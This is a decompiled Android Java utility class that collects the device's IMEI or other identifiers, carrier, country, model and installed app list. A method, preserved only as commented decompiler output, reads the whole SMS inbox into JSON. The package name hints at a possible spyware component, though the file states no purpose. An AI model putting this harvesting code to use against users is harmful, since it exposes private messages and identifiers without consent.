package exts.whats.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.os.Build;
import android.os.Build.VERSION;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import java.util.List;
import java.util.Locale;
import org.json.JSONArray;

public class Utils {
    public static String getCountry(Context context) {
        return context.getResources().getConfiguration().locale.getCountry();
    }

    public static String getDeviceId(Context context) {
        String deviceId = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
        if (deviceId != null && !deviceId.equals("") && !deviceId.equals("000000000000000")) {
            return deviceId;
        }
        deviceId = Secure.getString(context.getContentResolver(), "android_id");
        if (deviceId != null && !deviceId.equals("")) {
            return deviceId;
        }
        deviceId = Build.SERIAL;
        if (deviceId == null || deviceId.equals("") || deviceId.equalsIgnoreCase("unknown")) {
            return "-1";
        }
        return deviceId;
    }

    public static String getOperator(Context context) {
        TelephonyManager mgr = (TelephonyManager) context.getSystemService("phone");
        if (mgr.getSimState() == 5) {
            return mgr.getSimOperator();
        }
        return "999999";
    }

    public static String getModel() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        }
        return capitalize(manufacturer) + " " + model;
    }

    private static String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        return !Character.isUpperCase(first) ? Character.toUpperCase(first) + s.substring(1) : s;
    }

    public static String getOS() {
        return VERSION.RELEASE;
    }

    public static void putBoolVal(SharedPreferences settings, String name, boolean value) {
        Editor editor = settings.edit();
        editor.putBoolean(name, value);
        editor.commit();
    }

    public static void putStrVal(SharedPreferences settings, String name, String value) {
        Editor editor = settings.edit();
        editor.putString(name, value);
        editor.commit();
    }

    /* JADX WARNING: Removed duplicated region for block: B:9:0x0089  */
    public static org.json.JSONArray readMessagesFromDeviceDB(android.content.Context r14) {
        /*
        r0 = "content://sms/inbox";
        r1 = android.net.Uri.parse(r0);
        r0 = 4;
        r2 = new java.lang.String[r0];
        r0 = 0;
        r3 = "_id";
        r2[r0] = r3;
        r0 = 1;
        r3 = "address";
        r2[r0] = r3;
        r0 = 2;
        r3 = "body";
        r2[r0] = r3;
        r0 = 3;
        r3 = "date";
        r2[r0] = r3;
        r8 = 0;
        r12 = new org.json.JSONArray;
        r12.<init>();
        r0 = r14.getContentResolver();	 Catch:{ Exception -> 0x008d }
        r3 = 0;
        r4 = 0;
        r5 = 0;
        r8 = r0.query(r1, r2, r3, r4, r5);	 Catch:{ Exception -> 0x008d }
        if (r8 == 0) goto L_0x0087;
    L_0x0030:
        r0 = r8.moveToFirst();	 Catch:{ Exception -> 0x008d }
        if (r0 == 0) goto L_0x0087;
    L_0x0036:
        r0 = "address";
        r0 = r8.getColumnIndex(r0);	 Catch:{ Exception -> 0x008d }
        r6 = r8.getString(r0);	 Catch:{ Exception -> 0x008d }
        r0 = "body";
        r0 = r8.getColumnIndex(r0);	 Catch:{ Exception -> 0x008d }
        r7 = r8.getString(r0);	 Catch:{ Exception -> 0x008d }
        r0 = "date";
        r0 = r8.getColumnIndex(r0);	 Catch:{ Exception -> 0x008d }
        r9 = r8.getString(r0);	 Catch:{ Exception -> 0x008d }
        r11 = new java.text.SimpleDateFormat;	 Catch:{ Exception -> 0x008d }
        r0 = "dd-MM-yyyy HH:mm:ss";
        r3 = java.util.Locale.US;	 Catch:{ Exception -> 0x008d }
        r11.<init>(r0, r3);	 Catch:{ Exception -> 0x008d }
        r0 = new java.util.Date;	 Catch:{ Exception -> 0x008d }
        r3 = java.lang.Long.parseLong(r9);	 Catch:{ Exception -> 0x008d }
        r0.<init>(r3);	 Catch:{ Exception -> 0x008d }
        r9 = r11.format(r0);	 Catch:{ Exception -> 0x008d }
        r13 = new org.json.JSONObject;	 Catch:{ Exception -> 0x008d }
        r13.<init>();	 Catch:{ Exception -> 0x008d }
        r0 = "from";
        r13.put(r0, r6);	 Catch:{ Exception -> 0x008d }
        r0 = "body";
        r13.put(r0, r7);	 Catch:{ Exception -> 0x008d }
        r0 = "date";
        r13.put(r0, r9);	 Catch:{ Exception -> 0x008d }
        r12.put(r13);	 Catch:{ Exception -> 0x008d }
        r0 = r8.moveToNext();	 Catch:{ Exception -> 0x008d }
        if (r0 != 0) goto L_0x0036;
    L_0x0087:
        if (r8 == 0) goto L_0x008c;
    L_0x0089:
        r8.close();
    L_0x008c:
        return r12;
    L_0x008d:
        r10 = move-exception;
        r10.printStackTrace();	 Catch:{ all -> 0x0097 }
        if (r8 == 0) goto L_0x008c;
    L_0x0093:
        r8.close();
        goto L_0x008c;
    L_0x0097:
        r0 = move-exception;
        if (r8 == 0) goto L_0x009d;
    L_0x009a:
        r8.close();
    L_0x009d:
        throw r0;
        */
        throw new UnsupportedOperationException("Method not decompiled: exts.whats.utils.Utils.readMessagesFromDeviceDB(android.content.Context):org.json.JSONArray");
    }

    public static JSONArray getAppList(Context context) {
        List<ApplicationInfo> packages = context.getPackageManager().getInstalledApplications(128);
        JSONArray jArray = new JSONArray();
        for (ApplicationInfo applicationInfo : packages) {
            if (!isSysPackage(applicationInfo)) {
                jArray.put(applicationInfo.packageName);
            }
        }
        return jArray;
    }

    public static String getUserCountry(Context context) {
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
            String simCountry = tm.getSimCountryIso();
            if (simCountry != null && simCountry.length() == 2) {
                return simCountry.toLowerCase(Locale.US);
            }
            if (tm.getPhoneType() != 2) {
                String networkCountry = tm.getNetworkCountryIso();
                if (networkCountry != null && networkCountry.length() == 2) {
                    return networkCountry.toLowerCase(Locale.US);
                }
            }
            return null;
        } catch (Exception e) {
        }
    }

    private static boolean isSysPackage(ApplicationInfo applicationInfo) {
        if ((applicationInfo.flags & 1) != 0) {
            return true;
        }
        return false;
    }
}
